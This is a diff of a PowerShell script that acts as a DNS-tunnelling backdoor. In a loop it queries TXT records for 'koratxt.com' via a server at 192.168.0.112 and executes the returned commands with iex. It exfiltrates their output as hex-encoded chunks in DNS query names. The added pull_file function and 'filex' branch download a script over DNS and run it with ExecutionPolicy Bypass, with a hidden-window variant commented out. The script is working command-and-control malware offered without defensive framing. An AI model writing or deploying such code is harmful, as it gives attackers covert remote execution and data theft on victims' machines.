@@ -1,4 +1,11 @@
-﻿function StringToHex($i) {
+﻿$server = '192.168.0.112'
+$name = 'koratxt.com'
+$id = Get-Content env:computername
+if ($id.Length -gt 10) {
+    $id = $id.Substring(0,10)
+}
+
+function StringToHex($i) {
     $r = ""
     $i.ToCharArray() | ForEach-Object -Process {
         $x = [int][char]$_
@@ -29,22 +36,37 @@ function split_to_chunks($astring, $size=20) {
 }
 
 function send_response($response) {
-    $id = Get-Content env:computername
-    if ($id.Length -gt 10) {
-        $id.Substring(0,10)
-    }
     $chunks = (split_to_chunks ($response.Replace("`r`n",";") -replace '\s\s+', ','))
     foreach ($j in $chunks) {
-        $(Resolve-DnsName -Server "192.168.0.109" -Name "$id.$j.6f7574.koratxt.com" -Type TXT).Strings
+        $(Resolve-DnsName -Server $server -Name "65786563.$j.$name" -Type TXT).Strings
     }
-    $(Resolve-DnsName -Server "192.168.0.109" -Name "656e64.koratxt.com" -Type TXT)
+    $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
     return $id
 }
 
+function pull_file($size=255){
+    $f = New-Item -Path '.\' -Name 'txt.ps1' -ItemType File
+    $h = ''
+    $index = 0
+    $file_size = $(Resolve-DnsName -Server $server -Name "73697a65.$name" -Type TXT).Strings
+    foreach ($i in 1..[int]"$file_size") {        $x = $(Resolve-DnsName -Server $server -Name "66696c65.$index.$name" -Type TXT).Strings        $index += $size        $x | Add-Content -Path '.\txt.ps1'    }
+    $(Resolve-DnsName -Server $server -Name "656e64.$name" -Type TXT)
+}
 
 while ($true) {
-    $rawtxt = $(Resolve-DnsName -Server "192.168.0.109" -Name "koratxt.com" -Type TXT).Strings
-    if ($rawtxt.length -ne 0) {
+    $rawtxt = $(Resolve-DnsName -Server $server -Name $name -Type TXT).Strings
+    if ($rawtxt -eq "file") {
+        Remove-Item 'txt.ps1'
+        pull_file
+    }
+    elseif ($rawtxt -eq "filex") {
+        Remove-Item 'txt.ps1'
+        pull_file
+        #Start-Job -ScriptBlock {powershell.exe -NoE -Nop -NonI -w hidden -ExecutionPolicy Bypass -File '.\txt.ps1'}
+        Start-Job -ScriptBlock {powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -File '.\txt.ps1'}
+        Remove-Item 'txt.ps1'
+    }
+    elseif ($rawtxt.length -ne 0) {
         $response = (iex "$rawtxt") | Out-String
         if ($response.Length -gt 0) {
             send_response $response
